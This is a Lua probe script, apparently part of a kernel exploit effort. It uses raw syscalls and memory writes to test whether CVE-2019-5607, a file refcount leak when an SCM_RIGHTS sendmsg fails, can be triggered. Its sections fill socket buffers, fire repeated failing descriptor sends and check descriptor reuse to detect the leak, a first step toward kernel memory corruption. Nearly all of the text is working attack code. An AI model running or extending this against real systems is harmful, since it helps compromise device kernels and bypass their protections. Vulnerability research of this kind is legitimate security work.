-- CRASH_CLASS: MODERATE
-- PROBE 108b: CVE-2019-5607 refcount leak reachability test
--
-- 108a confirmed: SCM_RIGHTS works for SOCKET fds (not kqueue).
-- Self-referential sends work (fd_b over fd_b).
--
-- CVE-2019-5607: sendmsg with SCM_RIGHTS increments f_count in
-- unp_internalize() BEFORE checking delivery. If delivery fails
-- (e.g. receiver buffer full), the increment is not reversed → leak.
--
-- This probe tests:
-- A: Baseline refcount behavior — send, receive, verify fd works
-- B: Fill receiver buffer → trigger sendmsg failure with SCM_RIGHTS
-- C: Measure if failed sends leak references (fd still usable after close?)
-- D: Rapid leak loop — count how many refs we can leak per second

print("=== PROBE 108b: CVE-2019-5607 REFCOUNT LEAK TEST ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function safe_rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function safe_rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end
local function safe_wd(addr, val)
    local ok = pcall(function() memory.write_dword(addr, val) end)
    return ok
end
local function safe_wq(addr, val)
    local ok = pcall(function() memory.write_qword(addr, val) end)
    return ok
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end

local SYS_close      = 6
local SYS_getpid     = 20
local SYS_recvmsg    = 27
local SYS_sendmsg    = 28
local SYS_socket     = 97
local SYS_getsockopt = 118
local SYS_setsockopt = 105
local SYS_socketpair = 135
local SYS_write      = 4
local SYS_read       = 3
local SYS_fcntl      = 92

local AF_LOCAL      = 1
local SOCK_STREAM   = 1
local SOCK_DGRAM    = 2
local SOL_SOCKET    = 0xFFFF
local SCM_RIGHTS    = 1
local SO_RCVBUF     = 0x1002
local SO_SNDBUF     = 0x1001
local SO_ERROR      = 0x1007
local MSG_DONTWAIT  = 0x80
local F_SETFL       = 4
local F_GETFL       = 3
local O_NONBLOCK    = 4

local CMSG_DATA_OFF = 16

local pid = to_num(make_syscall(SYS_getpid)())
print("[*] pid: " .. pid)

pcall(function() collectgarbage("stop") end)

----------------------------------------------------------------
-- Helpers
----------------------------------------------------------------
local function create_socketpair(stype)
    stype = stype or SOCK_STREAM
    local sv = memory.alloc(8)
    safe_wd(sv, 0); safe_wd(sv + 4, 0)
    local ok, ret = pcall(function()
        return make_syscall(SYS_socketpair)(uint64(AF_LOCAL), uint64(stype),
            uint64(0), uint64(sv))
    end)
    if not ok or to_num(ret) ~= 0 then return nil, nil end
    return safe_rd(sv), safe_rd(sv + 4)
end

local function close_fd(fd)
    if fd == nil then return end
    pcall(function() make_syscall(SYS_close)(uint64(fd)) end)
end

local function set_nonblock(fd)
    pcall(function()
        local flags = to_num(make_syscall(SYS_fcntl)(uint64(fd), uint64(F_GETFL)))
        make_syscall(SYS_fcntl)(uint64(fd), uint64(F_SETFL), uint64(flags + O_NONBLOCK))
    end)
end

local function set_sockopt_int(fd, level, opt, val)
    local buf = memory.alloc(4)
    safe_wd(buf, val)
    local ok, ret = pcall(function()
        return make_syscall(SYS_setsockopt)(uint64(fd), uint64(level),
            uint64(opt), uint64(buf), uint64(4))
    end)
    return ok and to_num(ret) == 0
end

local function get_sockopt_int(fd, level, opt)
    local buf = memory.alloc(4)
    local len = memory.alloc(4)
    safe_wd(buf, 0)
    safe_wd(len, 4)
    local ok, ret = pcall(function()
        return make_syscall(SYS_getsockopt)(uint64(fd), uint64(level),
            uint64(opt), uint64(buf), uint64(len))
    end)
    if ok and to_num(ret) == 0 then return safe_rd(buf) end
    return nil
end

local function send_fd_scm(sock_fd, fd_to_send, flags)
    flags = flags or 0
    local iov_data = memory.alloc(8)
    safe_wd(iov_data, 0x41)
    local iov = memory.alloc(0x10)
    safe_wq(iov, uint64(iov_data))
    safe_wq(iov + 8, uint64(1))

    local cmsg = memory.alloc(0x20)
    for i = 0, 0x1F, 4 do safe_wd(cmsg + i, 0) end
    safe_wd(cmsg, 20)
    safe_wd(cmsg + 4, SOL_SOCKET)
    safe_wd(cmsg + 8, SCM_RIGHTS)
    safe_wd(cmsg + CMSG_DATA_OFF, fd_to_send)

    local msg = memory.alloc(0x30)
    for i = 0, 0x2F, 4 do safe_wd(msg + i, 0) end
    safe_wq(msg, uint64(0))
    safe_wd(msg + 8, 0)
    safe_wq(msg + 0x10, uint64(iov))
    safe_wd(msg + 0x18, 1)
    safe_wq(msg + 0x20, uint64(cmsg))
    safe_wd(msg + 0x28, 24)
    safe_wd(msg + 0x2C, 0)

    local ok, ret = pcall(function()
        return make_syscall(SYS_sendmsg)(uint64(sock_fd), uint64(msg), uint64(flags))
    end)
    if not ok then return -999 end
    return to_num(ret)
end

local function write_fill(fd, size)
    local buf = memory.alloc(size)
    for i = 0, size - 1, 4 do safe_wd(buf + i, 0x42424242) end
    local ok, ret = pcall(function()
        return make_syscall(SYS_write)(uint64(fd), uint64(buf), uint64(size))
    end)
    if not ok then return -999 end
    return to_num(ret)
end

-- ============================================================
-- SECTION A: Baseline — send socket fd, receive it, verify
-- ============================================================
print("")
print("--- A: BASELINE SCM_RIGHTS ---")

repeat
    local fd_a, fd_b = create_socketpair()
    if not fd_a then print("[A] socketpair FAILED"); break end
    print("[A] pair: " .. fd_a .. "," .. fd_b)

    -- Create a target socket to send
    local ok_t, tgt = pcall(function()
        return to_num(make_syscall(SYS_socket)(uint64(AF_LOCAL), uint64(SOCK_STREAM), uint64(0)))
    end)
    if not ok_t or tgt < 0 then print("[A] target socket FAILED"); close_fd(fd_a); close_fd(fd_b); break end
    print("[A] target fd=" .. tgt)

    local srv = send_fd_scm(fd_b, tgt)
    print("[A] sendmsg ret=" .. srv)

    if srv >= 0 then
        -- Receive
        local iov_d = memory.alloc(8)
        local iov = memory.alloc(0x10)
        safe_wq(iov, uint64(iov_d)); safe_wq(iov + 8, uint64(1))
        local cmsg = memory.alloc(0x40)
        for i = 0, 0x3F, 4 do safe_wd(cmsg + i, 0) end
        local rmsg = memory.alloc(0x30)
        for i = 0, 0x2F, 4 do safe_wd(rmsg + i, 0) end
        safe_wq(rmsg + 0x10, uint64(iov)); safe_wd(rmsg + 0x18, 1)
        safe_wq(rmsg + 0x20, uint64(cmsg)); safe_wd(rmsg + 0x28, 0x40)

        pcall(function() make_syscall(SYS_recvmsg)(uint64(fd_a), uint64(rmsg), uint64(0)) end)
        local recv_fd = safe_rd(cmsg + CMSG_DATA_OFF)
        print("[A] received fd=" .. tostring(recv_fd))
        if recv_fd and recv_fd >= 0 then close_fd(recv_fd) end
    end

    close_fd(tgt); close_fd(fd_a); close_fd(fd_b)
until true

-- ============================================================
-- SECTION B: Fill receiver buffer, then try SCM_RIGHTS
-- ============================================================
print("")
print("--- B: BUFFER FILL + SCM_RIGHTS FAILURE ---")

repeat
    local fd_a, fd_b = create_socketpair()
    if not fd_a then print("[B] socketpair FAILED"); break end

    -- Check buffer sizes
    local rcvbuf = get_sockopt_int(fd_a, SOL_SOCKET, SO_RCVBUF)
    local sndbuf = get_sockopt_int(fd_b, SOL_SOCKET, SO_SNDBUF)
    print("[B] rcvbuf=" .. tostring(rcvbuf) .. " sndbuf=" .. tostring(sndbuf))

    -- Try to minimize receive buffer
    set_sockopt_int(fd_a, SOL_SOCKET, SO_RCVBUF, 1)
    local new_rcvbuf = get_sockopt_int(fd_a, SOL_SOCKET, SO_RCVBUF)
    print("[B] after SO_RCVBUF=1: rcvbuf=" .. tostring(new_rcvbuf))

    -- Set sender nonblocking
    set_nonblock(fd_b)

    -- Fill the buffer
    local total_written = 0
    local fill_round = 0
    local fill_buf_sz = 4096
    while fill_round < 100 do
        local wret = write_fill(fd_b, fill_buf_sz)
        if wret <= 0 then break end
        total_written = total_written + wret
        fill_round = fill_round + 1
    end
    print("[B] filled " .. total_written .. " bytes in " .. fill_round .. " rounds")

    -- Create target socket fd
    local ok_t, tgt = pcall(function()
        return to_num(make_syscall(SYS_socket)(uint64(AF_LOCAL), uint64(SOCK_STREAM), uint64(0)))
    end)
    if not ok_t or tgt < 0 then
        print("[B] target socket FAILED"); close_fd(fd_a); close_fd(fd_b); break
    end
    print("[B] target fd=" .. tgt)

    -- Now try to send SCM_RIGHTS with full buffer
    print("[B] sending SCM_RIGHTS with full buffer (MSG_DONTWAIT)...")
    local fail_count = 0
    local success_count = 0
    for i = 1, 10 do
        local rv = send_fd_scm(fd_b, tgt, MSG_DONTWAIT)
        if rv < 0 then
            fail_count = fail_count + 1
        else
            success_count = success_count + 1
        end
        if i <= 5 then
            print("[B]   attempt " .. i .. ": ret=" .. rv)
        end
    end
    print("[B] results: " .. success_count .. " success, " .. fail_count .. " fail out of 10")

    if fail_count > 0 then
        print("[B] *** SENDMSG FAILURES WITH SCM_RIGHTS DETECTED ***")
        print("[B] *** If f_count was incremented before failure check, ***")
        print("[B] *** each failure leaks one reference! ***")
    end

    close_fd(tgt); close_fd(fd_a); close_fd(fd_b)
until true

-- ============================================================
-- SECTION C: Test if leaked refs prevent fd cleanup
-- ============================================================
print("")
print("--- C: REFCOUNT LEAK DETECTION ---")

repeat
    local fd_a, fd_b = create_socketpair()
    if not fd_a then print("[C] socketpair FAILED"); break end

    -- Minimize rcvbuf
    set_sockopt_int(fd_a, SOL_SOCKET, SO_RCVBUF, 1)
    set_nonblock(fd_b)

    -- Fill buffer
    local filled = 0
    for i = 1, 100 do
        local w = write_fill(fd_b, 4096)
        if w <= 0 then break end
        filled = filled + w
    end
    print("[C] filled " .. filled .. " bytes")

    -- Create target + send many failing SCM_RIGHTS
    local ok_t, tgt = pcall(function()
        return to_num(make_syscall(SYS_socket)(uint64(AF_LOCAL), uint64(SOCK_STREAM), uint64(0)))
    end)
    if not ok_t or tgt < 0 then
        print("[C] target FAILED"); close_fd(fd_a); close_fd(fd_b); break
    end
    print("[C] target fd=" .. tgt)

    local leak_attempts = 0
    for i = 1, 100 do
        local rv = send_fd_scm(fd_b, tgt, MSG_DONTWAIT)
        if rv < 0 then leak_attempts = leak_attempts + 1 end
    end
    print("[C] failed sendmsg attempts: " .. leak_attempts)

    -- Now close the target fd
    print("[C] closing target fd " .. tgt)
    close_fd(tgt)

    -- Try to allocate new fds — if target fd number is reused,
    -- kernel freed the struct file (no leak).
    -- If NOT reused despite being closed, refcount leak prevented cleanup.
    local new_fds = {}
    for i = 1, 10 do
        local ok_n, nfd = pcall(function()
            return to_num(make_syscall(SYS_socket)(uint64(AF_LOCAL), uint64(SOCK_STREAM), uint64(0)))
        end)
        if ok_n and nfd >= 0 then
            table.insert(new_fds, nfd)
        end
    end
    print("[C] new fd numbers: " .. table.concat(new_fds, ","))

    local reused = false
    for _, nfd in ipairs(new_fds) do
        if nfd == tgt then reused = true end
    end
    print("[C] target fd " .. tgt .. " reused: " .. tostring(reused))
    if not reused then
        print("[C] *** TARGET FD NOT REUSED — POSSIBLE REFCOUNT LEAK ***")
    else
        print("[C] fd reused normally — kernel may have patched the leak")
    end

    for _, nfd in ipairs(new_fds) do close_fd(nfd) end
    close_fd(fd_a); close_fd(fd_b)
until true

-- ============================================================
-- SECTION D: DGRAM socketpair test (alternative trigger)
-- ============================================================
print("")
print("--- D: DGRAM SOCKETPAIR ---")

repeat
    local fd_a, fd_b = create_socketpair(SOCK_DGRAM)
    if not fd_a then
        print("[D] DGRAM socketpair FAILED")
        break
    end
    print("[D] DGRAM pair: " .. fd_a .. "," .. fd_b)

    local ok_t, tgt = pcall(function()
        return to_num(make_syscall(SYS_socket)(uint64(AF_LOCAL), uint64(SOCK_STREAM), uint64(0)))
    end)
    if not ok_t or tgt < 0 then
        print("[D] target FAILED"); close_fd(fd_a); close_fd(fd_b); break
    end

    local rv = send_fd_scm(fd_b, tgt)
    print("[D] DGRAM sendmsg SCM_RIGHTS ret=" .. rv)

    if rv >= 0 then
        print("[D] *** SCM_RIGHTS WORKS OVER DGRAM ***")
        -- DGRAM has per-message semantics — easier to control buffer
        set_sockopt_int(fd_a, SOL_SOCKET, SO_RCVBUF, 1)
        set_nonblock(fd_b)

        local fail_count = 0
        for i = 1, 50 do
            local r2 = send_fd_scm(fd_b, tgt, MSG_DONTWAIT)
            if r2 < 0 then fail_count = fail_count + 1 end
        end
        print("[D] 50 DGRAM sends: " .. (50 - fail_count) .. " ok, " .. fail_count .. " fail")
    end

    close_fd(tgt); close_fd(fd_a); close_fd(fd_b)
until true

print("")
print("=== PROBE 108b COMPLETE ===")
